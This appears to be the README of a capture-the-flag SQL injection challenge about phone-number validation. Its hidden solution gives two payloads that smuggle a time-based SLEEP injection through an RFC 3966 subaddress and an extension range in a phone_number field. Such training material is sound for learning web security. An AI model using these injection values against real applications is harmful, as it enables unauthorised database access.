# Phone Number Validation
Is this app vulnerable to SQLi? Exploit it!

## Installation
Run the following command to deploy the challenge:
```bash
docker compose up -d
```


<details>
  <summary>Toggle to see the solution</summary>

  This challenge is vulnerable in several ways. Here are two of them:
  1. According to RFC 3966, an ISDN-Subaddress can follow the phone number.
  2. Library implementation also allows additional phone number ranges such as "x12/x34" after the phone number.

  Solution:
  ```json
  {
    // First Solution (RFC 3966) 
    "phone_number": "989123456789;isub=x', (SELECT SLEEP(10))) -- -",
    
    // Second Solution (RFC 3966) 
    "phone_number": "989123456789 x1/x2', (SELECT SLEEP(10))) -- -"
  }
  ```

</details>